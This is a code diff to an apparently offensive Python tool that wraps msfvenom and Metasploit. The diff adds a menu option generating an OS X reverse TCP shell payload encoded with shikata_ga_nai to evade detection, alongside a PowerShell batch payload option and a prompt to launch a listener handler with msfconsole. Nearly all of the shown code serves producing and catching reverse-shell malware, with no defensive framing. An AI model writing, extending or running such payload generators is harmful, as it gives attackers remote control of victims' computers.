@@ -2,15 +2,26 @@ import os, random
 
 def menu():
     banner()
-    print("─╼┤templates├──────────────────────────────────────\n")
-    os.system("ls templates")
-    template = input("\n─╼┤selection├─> ")
-    payloadGenerator(template)
+    print("─╼┤payloads├───────────────────────────────────────\n")
+    print("\t\t(1) macho (osx)")
+    print("\t\t(2) powershell (win)\n")
+    mode = input("─╼┤selection├─> ")
+    payloadGenerator(mode)
 
-def payloadGenerator(template):
-    print("\n")
-    command = "sudo msfvenom -p generic/custom PAYLOADFILE=templates/"+template+" -a x86 --platform win -e psbase NOEXIT SYSWOW64 -o payload.bat"
-    os.system(command)
+def payloadGenerator(mode):        
+    if mode == "1":
+        print("\n")
+        command = "sudo msfvenom -p osx/x86/shell_reverse_tcp -a x86 --platform osx -e x86/shikata_ga_nai -o shadowpayload.macho"
+        os.system(command)
+        
+    elif mode == "2":
+        print("─╼┤templates├──────────────────────────────────────\n")
+        os.system("ls templates")
+        template = input("\n─╼┤selection├─> ")
+        print("\n")
+        command = "sudo msfvenom -p generic/custom PAYLOADFILE=templates/"+template+" -a x86 --platform win -e psbase NOEXIT SYSWOW64 -o payload.bat"
+        os.system(command)
+        
     print("\n")
     handler = input("─╼┤launch handler?(Y/n)├─> ")
     if handler == "y":
@@ -19,7 +30,7 @@ def payloadGenerator(template):
         launchHandler()
     else:
         exit()
-        
+    
 def launchHandler():
     print("\n")
     command = "msfconsole -r handler.conf"
